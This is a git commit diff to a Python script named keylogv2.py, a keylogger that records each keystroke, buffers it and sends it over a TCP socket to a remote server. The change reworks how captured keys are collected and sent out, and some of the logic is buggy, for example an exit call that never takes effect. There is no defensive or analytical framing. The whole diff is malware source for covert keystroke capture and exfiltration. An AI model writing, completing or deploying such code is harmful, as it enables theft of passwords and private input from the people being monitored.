59423555d20a814c54ac73518db467d0c849659f
enzo-hmdy <enzo.hmdy@gmail.com>
2023-04-04 15:09:13 -0400

    a

--- keylogv2.py
+++ keylogv2.py
@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-
 import socket
 import sys
 import time
@@ -21,31 +20,48 @@ def check_server():
         return False # return False if the server is not reachable
 
 # send the keys to the server
-def send_keys(keys):
+def send_keys(buffer):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create a new socket object for TCP/IP communication
     s.connect((ip, port)) # connect to the server
-    
-    buffer = '' # initialize the buffer
-    for ch in keys:
-        buffer += ch # add the current character to the buffer
-        if len(buffer) == 8: # if the buffer is full
-            s.send(buffer.encode()) # send the buffer to the server
-            buffer = '' # clear the buffer
+    if len(buffer) == 8: # if the buffer is full
+        s.send(buffer.encode()) # send the buffer to the server
+        buffer = '' # clear the buffer
             
     if len(buffer) > 0: # if there are remaining characters in the buffer
         s.send(buffer.encode()) # send the remaining characters to the server
         
-    print(f"sent keys: {keys}") # print the sent keys
+    print(f"sent keys: {buffer}") # print the sent keys
     s.close() # close the socket
 
 
 # the keylogger function
 def on_press(key):
+    # define a variable to store the pressed keys even if the function is called multiple times
+    global buffer
     try:
-        # convert the key to a string and send it to the server
-        send_keys(str(key))
-    except:
-        pass
+        buffer += key.char # add the pressed key to the buffer
+        print(f"pressed key: {key.char}") # print the pressed key
+        if key.char == '\x03':
+            # if the user pressed Ctrl+C, stop the keylogger
+            SystemExit(0)
+        elif key.char == '\x04':
+            # if the user pressed Ctrl+D, stop the keylogger
+            SystemExit(0)
+        # if it enter or backspace, send the buffer to the server
+        elif key.char == '\r' or key.char == '\x08':
+            send_keys(buffer)
+            buffer = ''
+        # if the buffer is full, send the buffer to the server
+        elif len(buffer) == 8:
+            send_keys(buffer)
+            buffer = ''
+        
+    
+        
+    except AttributeError:
+        buffer += key.name
+        print(f"pressed key: {key.name}") # print the pressed key
+    send_keys(buffer) # send the pressed key to the server
 
 # main function
 if __name__ == "__main__":
